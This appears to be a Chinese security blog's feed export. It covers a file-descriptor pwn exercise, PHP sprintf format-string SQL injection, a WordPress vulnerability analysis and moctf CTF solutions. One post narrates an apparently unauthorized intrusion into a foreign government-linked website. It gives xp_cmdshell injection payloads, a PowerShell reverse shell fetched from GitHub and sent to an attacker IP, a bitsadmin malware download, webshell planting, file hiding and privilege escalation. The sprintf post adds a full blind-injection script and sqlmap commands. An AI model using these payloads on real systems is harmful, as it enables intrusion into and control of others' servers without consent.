    <content type="text"><![CDATA[想学二进制的pwn弟弟正在艰难的起步 0x01 前言 首先我们先普及一下什么是File descriptor？维基百科中说：is an abstract indicator (handle) used to access a file or other input/output resource一个文件或其他输入/输出资源的抽象指示符在操作系统中可以这样去理解：进程(数值+指针)-&gt;系统(文件表中一系列操作)-&gt;引节点表(描述文件系统对象)那么进程中的file descriptor的这个数值其实就是 is an abstract indicator (handle) used to access a file or other input/output resource 然后他是指向相应的file table 0x02 走进File descriptor 我们来看四个file descriptor的值会以此增加，他们只想不同的操作那么为什么从3开始？是不是巧合？012去哪呢？在证明0、1、2的去向之前，我们先看一下file descriptor值的分配规则：fd0与fd1从3开始依次递增，我们刚才的第二个问题就不是巧合，然后我们把fd0的句柄close掉，也就说刚才的3关闭了，重新开始一个fd2，发现fd2的值为3，而不是5，也就是占用了刚才关闭的fd0的值我们就不妨这么猜测，如下图假如继续fd3=open，那么fd3值为5，也就是在红色区域那么我们可以初步得出一个结论，分配原则：寻找没有被占用的最低的值，然后去占用那么我们证实我们的结论和探寻0、1、2在哪？其实那么，我们关闭stdin标准输入来看下会发生什么？运行fd后直接输入数值，两次不一样，也就是标准输入被关闭，in自动填充一个随机值继续关闭stdout输入hello后，没有执行printf输出函数，然后我们将stdout关闭调，新开一个fd，按照我们之前的推断那么fd值应该为1 0x03 pwnable-fd 把结论进行验证，使得对file descriptor更深刻了，我们来做一下pwnable的fd题目巩固一下：ssh连上后，cat fd.c只需要让buf的值为 LETMEWIN 即可cat flag，buf的是read()函数从fd中获取的，fd又是atoi(argv[1]) - 0x1234得来的，可以控制。那么根据我们刚才学习的file descriptor的知识，只需要让fd为0，那么buf的值就是可以通过输入控制的，计算可以知道argv[1]的值4660虽然flag得到了，为了学习pwn，练习写一下exp 0x04 尾记 想学习二进制的pwn弟弟还需要努力，希望我的小白学习经验记录下来可以帮助更多和我一样的小白。]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透随笔-记一次境外网站渗透]]></title>
    <url>%2F2019%2F11%2F17%2F1%2F</url>
    <content type="text"><![CDATA[写下发生的故事，细品人生的乐趣 0x1 Forward 前段时间，某位师傅找到国外政府网站的sql注入 拿到站点简单测试了下发现123数据库：mssql系统版本：windows服务器可以使用xp_cmdshell 执行1payload: aspx?AticalID=&apos;;use master;exec dbo.xp_cmdshell &apos;ping [服务器]&apos;;--+ 可以发现xp_cmdshell可使用，下一步就是找一下绝对路径，写shell直接拿下，在寻找绝对路径的时候，把url后面一部分上去后，会成功跳转到另一个网站 此时正式开始了 0x2 曲折的getshell获取绝对路径 很显然存在注入，但是不存在万能密码，可惜了，不过却可以从报错信息中发现绝对路径 此时把xp_cmdshell激活，然后把扩展库也激活1payload : admin&apos; exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;--+ 页面返回正常，应该是语句执行成功，于是ping一下服务器看一下时候可以使用，在这个时候有一个不错的收获，还想来源ip与之前那个政府站的ip是一样，猜测iis绑定了多个域名。 尝试写shell 此时先写一个txt文件试探一下是否可行 虽然返回正常，但是无法访问 http://xxx.xxx.xxx/a.txt ,找不到资源，当时在想是不不能写，很无奈，就去尝试可不可以直接反弹shell, 1C:\Users\&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress xxx.xxx.xxx.xxx -p 8080 但是360直接报毒，猜想这个办法行不通，试了一下果然不行，然后尝试远程下载我的服务器上的免杀msf，然后执行 1bitsadmin /transfer mydownloadjob /download /priority normal http://xxx.xxx.xxx.xxx/msf.exe %temp%/msf.exe 尝试去访问，网页404，查看apache日志，果然没有该ip的访问记录，这个办法pass，是不是杀软太强，或者权限太低，无法执行下载命令。然而就在走投无路的时候，事情出现了转机，在回过头来自习琢磨payload的时候，发现1c:\EMTTS Data\ 这个地方不对，本地尝试果真dos下路径有空格会报错，百度一波解决方法https://www.cnblogs.com/hoojjack/p/7010814.html 加上双引号后，重新构造payload，访问a.txt，有了收获 嘻嘻嘻，欢欢喜喜写shell 12这里普及一个小知识：&apos;&lt;&gt;&apos;在dos命令中需要转义 访问a.aspx发现404，只能说需要上免杀，不过之前应该好奇看看是什么杀软（国外不会也用360吧23333） 12payload:tasklist &gt; &quot;c:\EMTTS Data\xxxx\xxx\b.txt&quot; 百度一下123ESET这一名称最早来源于埃及神话中的女神Isis。Isis又称作Aset或Eset，是地神Geb和天神Nut的女儿，是主管爱情和富庶的女神，也是负责治疗和魔力的女神。ESET在英文中可以理解为Essential Solution Against Evolving Threats 之后尝试写冰蝎马，虽然写进去了，访问时出错 冰蝎连接也不行，仔细检查语句，始终连接不上又是一个峰回路转，不断尝试新的payload，不同的姿势，终于使用 &gt;&gt; 追加符号写文件，居然可以成功getshell，详细操作不多说，很简单的操作 至此成功getshell 提权 查看下系统信息，端口服务信息，路由信息 把补丁放在对比工具中 神器网站：https://bugs.hacking8.com/tiquan/另附几个：https://github.com/SecWiki/windows-kernel-exploits （补丁）、 https://www.uedbox.com/post/8744/ （本地提权工具） 现在先把shell文件加一个隐藏权限1234attrib +s +h a.aspxattrib命令 用于修改文件属性+s 设置系统文件属性+h 设置隐藏属性 但是发现权限不够，还是要提权，试过上传免杀msfpayload，但是通信时被杀，此方法pass，于是根据检查出来的漏洞进行提权（该方法后续尝试），因为是iis，直接祭出iis通杀0day 当然其他的方法也是可以的，后来用ms16-032也可以提权成功附网址:https://github.com/1234xxh/windows-kernel-exploits/tree/master/MS16-032 (fork来的) 发现3389设计开着的，直接远程连接 进去后找到这搞鬼的的东西 开始艰难的内网渗透（持续更新…）]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>getshell</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入解析sprintf格式化字符串漏洞]]></title>
    <url>%2F2018%2F11%2F05%2F1%2F</url>
    <content type="text"><![CDATA[只有不断地探索新的知识，才能感受到无穷的乐趣 0x01 sprintf()讲解首先我们先了解sprintf()函数 sprintf() 函数把格式化的字符串写入变量中。123sprintf(format,arg1,arg2,arg++)arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。 通过几个例子回顾一下sprintf 例子1：12345678&lt;?php$number = 123;$txt = sprintf(&quot;带有两位小数：%1\$.2f&lt;br&gt;不带小数：%1\$u&quot;,$number);echo $txt;?&gt;输出结果:带有两位小数：123.00 不带小数：123 例子2：12345678910111213141516171819&lt;?php$num1 = 123456789;$num2 = -123456789;$char = 50;// ASCII 字符 50 是 2//注释：格式值 &quot;%%&quot; 返回百分号echo sprintf(&quot;%%b = %b&quot;,$num1).&quot;&lt;br&gt;&quot;; // 二进制数echo sprintf(&quot;%%c = %c&quot;,$char).&quot;&lt;br&gt;&quot;; // ASCII 字符echo sprintf(&quot;%%s = %s&quot;,$num1).&quot;&lt;br&gt;&quot;; // 字符串echo sprintf(&quot;%%x = %x&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（小写）echo sprintf(&quot;%%X = %X&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（大写）?&gt;输出结果:%b = 111010110111100110100010101%c = 2 //注意var_dump(&apos;2&apos;)为string%s = 123456789%x = 75bcd15%X = 75BCD15 0x02 sprintf注入原理底层代码实现 我们来看一下sprintf()的底层实现方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475switch (format[inpos]) &#123;case &apos;s&apos;: &#123;zend_string *t;zend_string *str = zval_get_tmp_string(tmp, &amp;t);php_sprintf_appendstring(&amp;result, &amp;outpos,ZSTR_VAL(str),width, precision, padding,alignment,ZSTR_LEN(str),0, expprec, 0);zend_tmp_string_release(t);break; &#125; case &apos;d&apos;: php_sprintf_appendint(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign); break; case &apos;u&apos;: php_sprintf_appenduint(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment); break; case &apos;g&apos;: case &apos;G&apos;: case &apos;e&apos;: case &apos;E&apos;: case &apos;f&apos;: case &apos;F&apos;: php_sprintf_appenddouble(&amp;result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign ); break; case &apos;c&apos;: php_sprintf_appendchar(&amp;result, &amp;outpos, (char) zval_get_long(tmp)); break; case &apos;o&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec); break; case &apos;x&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec); break; case &apos;X&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec); break; case &apos;b&apos;: php_sprintf_append2n(&amp;result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec); break; case &apos;%&apos;: php_sprintf_appendchar(&amp;result, &amp;outpos, &apos;%&apos;); break; default: break;&#125; 可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%1$\）被替换为空 因此sprintf注入，或者说php格式化字符串注入的原理为：要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用。 这里我们举两个例子NO.1 不使用占位符号12345678&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot; ;$args = &quot;admin&quot; ;echo sprintf ( $sql , $args ) ;//=&gt; echo sprintf(&quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;, &quot;admin&quot;);//此时%\回去匹配admin字符串，但是%\只会匹配空运行后的结果select * from user where username = &apos;&apos; and 1=1#&apos; NO.2 使用占位符号12345678910&lt;?php$input = addslashes (&quot;%1$&apos; and 1=1#&quot; );$b = sprintf (&quot;AND b=&apos;%s&apos;&quot;, $input );$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; $b &quot;, &apos;admin&apos; );//对$input与$b进行了拼接//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; AND b=&apos;%1$\&apos; and 1=1#&apos; &quot;, &apos;admin&apos; );//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空echo $sql ;运行后的结果SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 对于这个问题，我们还可以这样写12$sql = sprintf (&quot;SELECT * FROM table WHERE a=&apos;%1$\&apos; AND b=&apos;%d&apos; and 1=1#&apos; &quot;,&apos;admin&apos;);//result: SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 第一个格式化处匹配时为空，会让给后面的格式化匹配 以上两个例子是吃掉’\’来使得单引号逃逸出来下面这个例子我们构造单引号 NO.3 对%c进行利用123456&lt;? php$input1 = &apos;%1$c) OR 1 = 1 /*&apos; ;$input2 = 39 ;$sql = &quot;SELECT * FROM foo WHERE bar IN (&apos; $input1 &apos;) AND baz = %s&quot; ;$sql = sprintf ( $sql , $input2 );echo $sql ; %c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。所以结果为：1SELECT * FROM foo WHERE bar IN (&apos;&apos;) OR 1 = 1 /*) AND baz = 39 小结 漏洞利用条件 sql语句进行了字符拼接 拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串1234567ps:mysql&gt; SELECT ascii(&apos;\&apos;&apos;);+-------------+| ascii(&apos;\&apos;&apos;) |+-------------+| 39 |+-------------+ 0x03 题目训练一道注入题目 形式很像SQL注入，而且题目中提示为SQLI先试了一下弱口令，确定username为admin那么就对username与password进行注入，开始普通注入，二次解码，宽字节，过滤空格，过滤关键字等姿势进行构造注入语句都无果，而且还耗费大量的时间，不过后来get到一种姿势，使用burpsuit的intruder跑一下，来查看那些字母或者字符没有被过滤掉（waf字典）后来发现%可疑，于是拿出来repeater一下sprintf函数出错，那么sprintf是什么，格式化字符串，于是乎就懂得其中的原理了，是其单引号逃逸构造username=admin%1$\’ and 1=2# 与 username=admin%1$\’ and 1=1#发现如下的结果可以发现’后面的语句带入执行了，这就是注入点，使用sqlmap跑一下事先抓取post包1python sqlmap.py -r 3.txt -p username --level 3 --dbs --thread 10 于是对ctf进行跑tables得到对flag跑columns得到对每个列进行dump但是dump下来不对，找了一波原因没有找到，开始用脚本跑跑完后才发现sqlmap跑出来的列不对，应该是flag，于是1python sqlmap.py -r 3.txt -p username --level 3 -D ctf -T flag -C flag --dump --thread 10 才得到正确结果 ：）下面是脚本跑的 中心思想 先判断length然后使用ascii判断字母ascii(substr(database(),” + str(i) +”,1))=” + str(ord(c)) + “#”使用这个语句进行判断 涉及到的一些知识点： 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#coding:utf-8import requestsimport stringdef boom(): url = r&apos;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&apos; s = requests.session() //会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。 dic = string.digits + string.letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-=&quot; right = &apos;password error!&apos; error = &apos;username error!&apos; lens = 0 i = 0 //确定当前数据库的长度 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;length(database())&gt;&quot; + str(i) + &quot;#&quot; data=&#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens=i break i+=1 pass print(&quot;[+]length(database()): %d&quot; %(lens)) //确定当前数据库的名字 strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr(database(),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]database():%s&quot; %(strs)) lens=0 i = 1 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; //对当前的数据库，查询第一个表的长度 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(table): %d&quot; %(lens)) strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot; + str(i) +&quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; // 数字一定要str才可以传入 data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]table_name:%s&quot; %(strs)) tablename = &apos;0x&apos; + strs.encode(&apos;hex&apos;) //编码为16进制 table_name = strs lens=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(column_name) from information_schema.columns where table_name = &quot; + str(tablename) + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(column): %d&quot; %(lens)) strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or &quot; + &quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot; + str(tablename) +&quot; limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]column_name:%s&quot; %(strs)) column_name = strs num=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select count(*) from &quot; + table_name + &quot;)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: num = i break i+=1 pass print(&quot;[+]number(column): %d&quot; %(num)) lens=0 i = 0 while True: payload = &quot;admin%1$\\&apos; or &quot; + &quot;(select length(&quot; + column_name + &quot;) from &quot; + table_name + &quot; limit 0,1)&gt;&quot; + str(i) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:1&#125; r = s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(value): %d&quot; %(lens)) i=1 strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or ascii(substr((select flag from flag limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;1&apos;&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]flag:%s&quot; %(strs))if __name__ == &apos;__main__&apos;: boom() print &apos;Finish!&apos; 1234567891011121314&lt;?php$input = addslashes(&quot;%1$&apos; and 1=1#&quot;);echo $input;echo &quot;\n&quot;;$b = sprintf(&quot;AND b=&apos;%s&apos;&quot;,$input);echo $b;echo &quot;\n&quot;;$sql = sprintf(&quot;select * from t where a=&apos;%s&apos; $b&quot;,&apos;admin&apos;);echo $sql;&gt;&gt;&gt;结果%1$\&apos; and 1=1#AND b=&apos;%1$\&apos; and 1=1#&apos;select * from t where a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 格式字符%后面会吃掉一个\即%1$\被替换为空，逃逸出来一个单引号，造成注入. 0x04 Wordpress格式化字符串漏洞漏洞跟踪 wordpress版本小于4.7.5在后台图片删除的地方存在一处格式化字符串漏洞官方在4.7.6已经给出了补救办法在我们即将要说的地方增加了这么一端代码1$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位 首先我们找到upload.php可以发现在deleta中 $post_id_del（比如int()） 未经过处理，直接传入123456789101112case &apos;delete&apos;: if ( !isset( $post_ids ) ) break; foreach ( (array) $post_ids as $post_id_del ) &#123; if ( !current_user_can( &apos;delete_post&apos;, $post_id_del ) ) //跟进 wp_die( __( &apos;Sorry, you are not allowed to delete this item.&apos; ) ); if ( !wp_delete_attachment( $post_id_del ) ) wp_die( __( &apos;Error in deleting.&apos; ) ); &#125; $location = add_query_arg( &apos;deleted&apos;, count( $post_ids ), $location ); break; 跟进wp_delete_attachment( )函数其中参数$post_id_del为图片的postidwp_delete_attachment( )中 调用了delete_metadata 函数12345function wp_delete_attachment( $post_id, $force_delete = false ) &#123;.......delete_metadata( &apos;post&apos;, null, &apos;_thumbnail_id&apos;, $post_id, true ); // delete all for any posts.......&#125; 继续跟进delete_metadata函数漏洞触发点主要在wp-includes/meta.php 的 delete_metadata函数里面， 有如下代码:12345678if ( $delete_all ) &#123; $value_clause = &apos;&apos;; if ( &apos;&apos; !== $meta_value &amp;&amp; null !== $meta_value &amp;&amp; false !== $meta_value ) &#123; $value_clause = $wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value ); &#125; $object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) );&#125; 调用了两个prepare函数跟进prepare函数12345678910111213141516171819public function prepare( $query, $args ) &#123; if ( is_null( $query ) ) return; // This is not meant to be foolproof -- but it will catch obviously incorrect usage. if ( strpos( $query, &apos;%&apos; ) === false ) &#123; _doing_it_wrong( &apos;wpdb::prepare&apos;, sprintf( __( &apos;The query argument of %s must have a placeholder.&apos; ), &apos;wpdb::prepare()&apos; ), &apos;3.9.0&apos; );&#125; $args = func_get_args(); array_shift( $args ); // If args were passed as an array (as in vsprintf), move them up if ( isset( $args[0] ) &amp;&amp; is_array($args[0]) ) $args = $args[0]; $query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s array_walk( $args, array( $this, &apos;escape_by_ref&apos; ) ); return @vsprintf( $query, $args );&#125; 详细看prepare函数对传入参数的处理过程首先对%s进行处理1234$query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s 把’%s’替换为%s，然后再把”%s”替换成%s，替换为浮点数%F 把%s替换成’%s’最后再进行vsprintf( $query, $args );对拼接的语句进行格式化处理 我们一步步分析假设传入的$meta_value为’admin’1$wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value ); 经过prepare函数处理后得到12vsprintf( &quot; AND meta_value = &apos;%s&apos;&quot;,&apos;admin&apos;)=&gt; AND meta_value = &apos;admin&apos; return到上一级函数后，继续执行这一条拼接语句：1$wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) 经过prepare函数处理后得到12vsprintf( &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = &apos;admin&apos;&quot;,&apos;admin&apos;)=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;admin&apos; 看起来一切都很正常，毫无bug但是我们可以思考一下，怎样使其形成注入呢？s&gt; 或者说怎样逃逸一个单引号？在之前我们先看一下，可控变量 $post_id_del 的路线1$post_id_del =&gt; $post_id =&gt; $meta_value =&gt; $args =&gt; $query 显然这里面两处admin都有单引号，而且两处都与 $post_id_del 联系，如何来选择？ 对于第一处单引号它是通过一次替换处理得到的，显然是对单引号&gt;无法处理对于第二处单引号经过两次的替换，（这里的意思是执行了两次的替换代码，可能第二段代码对他没有起到实质性的作用，仅仅是去点单引号然后又加上单引号）但是这一出经过了两次处理是必须的，那么我们是否能够是构造出另一个单引号（此时第二处有三个单引号）就可以闭合前面的单引号了 最重要的是，第二次的替换处理的变量是可控的，因此要引入单引号，我们需要$meta_value含有%s那么第一次的结果为12AND meta_value = &apos;X%sY&apos;（其中XY为未知量）//这里需要注意，为什么%s不被单引号围起来，我看过一篇博客，它是写的&apos;%s&apos;，这显然是错的，为什么呢？我们生成了&apos;%s&apos;是没错，不过还原一下过程就知道了，首先我们生成了AND meta_value = &apos;%s&apos;，注意此时与$meta_value没有半毛钱关系，后来的vsprintf后，才与$meta_value有了关系，原来的%s被替换成了X%sY，值得注意的是这里的%s没有经过任何处理，处理是在第二轮进行的，这是后话。 第二次后的结果为123SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;X&apos;%s&apos;Y&apos;（对于第二处的%s我们先不要带入格式化后的值，其实真实的语句应该为：SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;X&apos;admin&apos;Y&apos;） 分析到这里，相信大家应该知道传值（$meta_value）使单引号逃逸出来了吧 admin显然是多余的，那么我们需要把它放在单引号里面，因此第二个单引号需要去掉，那么第四个单引号需要注释掉，这就很轻而易举地构造sql语句AND meta_value = ‘Xadmin’YY里面就是我们注入的代码 漏洞利用 怎么去传值呢？利用格式化字符串漏洞 去掉第二个单引号就需要使该单引号成为%后的第一个字符，也就是%’，但是我们还需要一个占位符，%1$’ 这样就没有报错的去掉了该单引号 所以我们构造的payload为123456$meta_value = %1$%s AND SLEEP(5)#=&gt; AND meta_value = &apos;%1$%s AND SLEEP(5)&apos;=&gt; &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = AND meta_value = &apos;%1$&apos;%s&apos; AND SLEEP(5)#&apos;&quot;,&apos;admin&apos;其中 %1$&apos; =&gt; 空=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = AND meta_value = &apos;admin&apos; AND SLEEP(5)#&apos;成功利用该漏洞形成时间注入 漏洞修补 现在我们说一下第四部分开头的补救方法后来官方在prepare函数加了这一代码1$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>Wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[moctf-web探索]]></title>
    <url>%2F2018%2F11%2F02%2F1%2F</url>
    <content type="text"><![CDATA[题记：前天晚上突然想刷CTF，就找了上个星期刚刚重新开放Moctf平台，作为一只半只脚还没踏进大门的webdog，记录一下自己的web历程 0x01 一道水题 进入后，点击查看源码即可获得flagview-source:http://119.23.73.3:5001/web1/。 0x02 还是水题 一道考察html标签属性的题目，修改disabled与maxlength属性123&lt;input type=&quot;password&quot; value=&quot;&quot; disabled=&quot;disabled&quot; name=&quot;password&quot; maxlength=&quot;4&quot;&gt;=&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; 0x03 访问限制 提示：只允许使用NAIVE浏览器访问！显然考察user-agent，于是修改user-agent发包，发现回显为：只有香港记者才能访问，于是又去修改Accept-Language，得到flag12User-Agent: NAIVEAccept-Language: zh-HK,zh;q=0.9 插一个题外话，NAIVE浏览器让我想到了黑曜石浏览器，做个题目时，我条件反射地先去go0gle了一下NAIVE浏览器，看看有木有这个浏览器-.-，想试一下的朋友们可以点击 0x04 机器蛇 第一眼看到后，想到应该是考察js，然后就想F12看一下js代码大体逻辑，emmmm，看完没发现什么，直到把翻到最下面，才意识到自己思路错了。提示&lt;!–robots.txt–&gt;，访问发现flagxxxx.php,再次访问，在注释中可以得到flag 0x05 PHP黑魔法 看到名字，应该就能菜刀是php弱类型。进入提示：似乎少点什么，查看源代码，抓包均无果，考虑源码泄漏，发现是index.php~源码泄漏。123456789101112131415161718view-source:http://119.23.73.3:5001/web5/index.php~=&gt;&lt;?php $flag=&quot;moctf&#123;**************&#125;&quot;; if (isset($_GET[&apos;a&apos;])&amp;&amp;isset($_GET[&apos;b&apos;])) &#123; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if($a==$b) &#123; echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;; &#125; else &#123; if(md5($a)==md5($b)) &#123; echo &quot;&lt;center&gt;&quot;.$flag.&quot;&lt;/center&gt;&quot;; echo &quot;By:daoyuan&quot;; &#125; else echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;; &#125; &#125; payload: ?a=QNKCDZO&amp;b=240610708 0x06 我想要钱 源码审计题目123456789101112&lt;?php include &quot;flag.php&quot;; highlight_file(__FILE__); if (isset($_GET[&apos;money&apos;])) &#123; $money=$_GET[&apos;money&apos;]; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money))&#123; echo $flag; &#125; else echo &quot;Wrong Answer!&quot;; &#125; else echo &quot;Wrong Answer!&quot;;?&gt; 限制为：money长度小于5，并且数值很大，不是数组。payload: ?money=4e10 0x07 登录就对了 根据题目，是想让我们登录进去，首先是试弱口令，无果；再试万能密码，成功登录，flag在源代码中1payload：name = admin&apos; or 1=1#&amp;pass=1 0x08 文件包含 发现flfile=welcome.txt，于是尝试LFIpayload：http://119.23.73.3:5001/web8/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php=&gt;base64解码得到flag 0x09 暴跳的老板 抓包发现reponse里面有提示123456789101112131415161718192021222324252627# reponseHTTP/1.1 200 OKDate: Fri, 02 Nov 2018 17:24:35 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.14Dear: MyBossVary: Accept-EncodingContent-Length: 137Content-Type: text/html于是携带参数请求POST /web1/do.php HTTP/1.1Host: 119.23.73.3:5006Proxy-Connection: keep-aliveContent-Length: 22Cache-Control: max-age=0Origin: 